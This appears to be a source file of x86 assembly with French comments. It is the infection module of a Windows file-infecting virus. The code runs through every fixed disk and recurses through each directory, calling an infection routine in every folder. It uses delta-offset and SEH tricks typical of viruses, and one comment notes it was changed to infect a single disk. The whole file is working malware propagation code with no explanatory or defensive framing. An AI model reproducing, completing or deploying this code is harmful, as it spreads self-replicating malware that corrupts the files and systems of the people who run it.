   ;MODULE : INFECTION
   ;Tout ce qui est propagation du virus (autre que le rep courant, ca c'est présent
   ;dans main.asm).


   ;==================== INFECTION DE TOUS LES DISQUES =========================

   ;INFECTE_DISQUES : infecte tous les disques physiques
   ;in: none
   ; out: none
   infecte_disques proc near
                   pusha
                   call delta2

   delta2:         pop ebp
                   sub ebp,offset delta2

                   call seh3
   seh_handler3:
                   mov esp,[esp+8]
                   mov ebx,[esp+4]
                   xor eax,eax
                   mov fs:[eax],ebx
                   push dword ptr 0
                   call [ebp+ExitThread]
   seh3:
                   xor eax,eax
                   push dword ptr fs:[eax]
                   mov fs:[eax],esp

                   lea ebx,[ebp+disque]
                   inc byte ptr [ebx]
                   push ebx
                   call_ GetDriveType               ; GetDriveType
                   test eax,eax
                   jz infecte_disques                ; Drive Type cannot be determinated
                   dec eax
                   jz infecte_disques                 ; Root dir doesn't exist
                   cmp al,3
                   jae infecte_disques                    ; CDROM ou RamDisk
   DiskOK:
                   push ebx
                   call_ SetCurrentDirectory       ; change de disque
                   call infecte_disque
   ; MODIF: infecte un seul disque                jmp MegaLoop

   infection_terminee:
                   xor eax,eax
                   push eax
                   call_ ExitThread                   ; exit thread
                   popa
                   ret
   infecte_disques endp



   ;INFECTE_DISQUE : infecte le disque physique courant. Fonction récursive.
   ;in: none
   ;out: none
   infecte_disque proc near
                   pusha
                   push ebx
                   push dword ptr SLEEPTIME_ON_INFECT_DIR
                   call_ Sleep

                   call infect_rep
   ID_FF:
                   lea esi,[ebp+WFD]
                   lea eax,[ebp+dmask]             ; '*',0
                   push esi
                   push eax
                   call_ FindFirstFile
                   mov ebx,eax
                   inc eax
                   jmp ID_opt
   ID_FN:          lea esi,[ebp+WFD]
                   push ebx
                   push esi
                   push ebx
                   call_ FindNextFile
                   pop ebx
   ID_opt:         test eax,eax
                   jz ID_FNfin
                   test [ebp+WFD_dwFileAttributes],dword ptr 10h; ATTRIB_DIR
                   jz ID_FN
                   cmp byte ptr [ebp+WFD_szFileName],'.'
                   jz ID_FN
                   lea esi,[ebp+WFD_szFileName]
                   push ebx
                   push esi
                   call_ SetCurrentDirectory
                   pop ebx
                   call infecte_disque
                   jmp ID_FN
   ID_FNfin:
                   push ebx
                   call_ FindClose
                   lea esi,[ebp+dotdot] ;remonte d'un répertoire
                   push esi
                   call_ SetCurrentDirectory
   IDfin:          pop ebx
                   popa
                   ret
   infecte_disque endp
